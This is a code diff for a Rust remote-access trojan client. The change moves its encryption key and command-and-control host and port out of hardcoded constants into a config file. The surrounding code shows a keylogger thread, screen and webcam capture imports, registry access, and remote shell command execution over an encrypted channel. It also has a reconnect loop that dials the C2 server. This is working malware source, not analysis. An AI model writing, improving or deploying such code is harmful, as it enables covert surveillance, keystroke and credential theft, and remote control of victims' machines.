@@ -15,16 +15,30 @@ use winreg::RegKey;
 use winreg::enums::HKEY_CURRENT_USER;
 use scrap::{Capturer, Display};
 use nokhwa::{Camera, utils::{CameraIndex, RequestedFormat, RequestedFormatType}, pixel_format::RgbFormat};
+use toml;
+use hex;
 
-const ENCRYPTION_KEY: [u8; 32] = [
-    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
-    0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
-    0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
-    0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f,
-];
+#[derive(Deserialize)]
+struct Config {
+    client: ClientConfig,
+    security: SecurityConfig,
+}
 
-const C2_HOST: &str = "127.0.0.1";
-const C2_PORT: u16 = 7878;
+#[derive(Deserialize)]
+struct ClientConfig {
+    host: String,
+    port: u16,
+}
+
+#[derive(Deserialize)]
+struct SecurityConfig {
+    encryption_key: String,
+}
+
+fn load_config() -> Config {
+    let content = std::fs::read_to_string("config.toml").expect("Failed to read config.toml");
+    toml::from_str(&content).expect("Failed to parse config")
+}
 
 #[derive(Serialize, Deserialize)]
 enum Command {
@@ -45,9 +59,9 @@ enum Response {
     Error(String),
 }
 
-fn encrypt(data: &[u8]) -> Vec<u8> {
-    let key = Key::<Aes256Gcm>::from_slice(&ENCRYPTION_KEY);
-    let cipher = Aes256Gcm::new(&key);
+fn encrypt(data: &[u8], key: &[u8;32]) -> Vec<u8> {
+    let key_slice = Key::<Aes256Gcm>::from_slice(key);
+    let cipher = Aes256Gcm::new(&key_slice);
     let nonce_bytes = rand::thread_rng().gen::<[u8; 12]>();
     let nonce = Nonce::from_slice(&nonce_bytes);
 
@@ -57,12 +71,12 @@ fn encrypt(data: &[u8]) -> Vec<u8> {
     result
 }
 
-fn decrypt(data: &[u8]) -> Result<Vec<u8>, String> {
+fn decrypt(data: &[u8], key: &[u8;32]) -> Result<Vec<u8>, String> {
     if data.len() < 12 {
         return Err("Data too short".to_string());
     }
-    let key = Key::<Aes256Gcm>::from_slice(&ENCRYPTION_KEY);
-    let cipher = Aes256Gcm::new(&key);
+    let key_slice = Key::<Aes256Gcm>::from_slice(key);
+    let cipher = Aes256Gcm::new(&key_slice);
     let (nonce_bytes, ciphertext) = data.split_at(12);
     let nonce = Nonce::from_slice(nonce_bytes);
 
@@ -130,7 +144,7 @@ fn keylogger_thread(tx: std::sync::mpsc::Sender<String>) {
     let _ = listen(callback);
 }
 
-async fn handle_connection(mut stream: TcpStream) -> Result<(), Box<dyn std::error::Error>> {
+async fn handle_connection(mut stream: TcpStream, encryption_key: &[u8;32]) -> Result<(), Box<dyn std::error::Error>> {
     let (mut reader, mut writer) = stream.split();
     let keylog_data = Arc::new(Mutex::new(String::new()));
     let (tx, rx) = std::sync::mpsc::channel();
@@ -153,7 +167,7 @@ async fn handle_connection(mut stream: TcpStream) -> Result<(), Box<dyn std::err
             Ok(0) => break, // connection closed
             Ok(n) => {
                 let encrypted = &buf[..n];
-                if let Ok(decrypted) = decrypt(encrypted) {
+                if let Ok(decrypted) = decrypt(encrypted, encryption_key) {
                     if let Ok(cmd) = serde_json::from_slice::<Command>(&decrypted) {
                         let response = match cmd {
                             Command::Shell(cmd_str) => {
@@ -227,7 +241,7 @@ async fn handle_connection(mut stream: TcpStream) -> Result<(), Box<dyn std::err
                             Command::Exit => break,
                         };
                         let json_resp = serde_json::to_vec(&response).unwrap();
-                        let encrypted_resp = encrypt(&json_resp);
+                        let encrypted_resp = encrypt(&json_resp, encryption_key);
                         writer.write_all(&encrypted_resp).await.ok();
                     }
                 }
@@ -253,11 +267,18 @@ async fn main() {
         std::process::exit(0);
     }
 
+    let config = load_config();
+    let c2_host = config.client.host;
+    let c2_port = config.client.port;
+    let key_str = config.security.encryption_key;
+    let mut encryption_key = [0u8; 32];
+    hex::decode_to_slice(&key_str, &mut encryption_key).expect("Invalid key");
+
     loop {
-        match TcpStream::connect((C2_HOST, C2_PORT)).await {
+        match TcpStream::connect((c2_host.as_str(), c2_port)).await {
             Ok(stream) => {
                 println!("[+] Connected to C2 successfully");
-                if handle_connection(stream).await.is_ok() {
+                if handle_connection(stream, &encryption_key).await.is_ok() {
                     // Normal close
                 }
             }
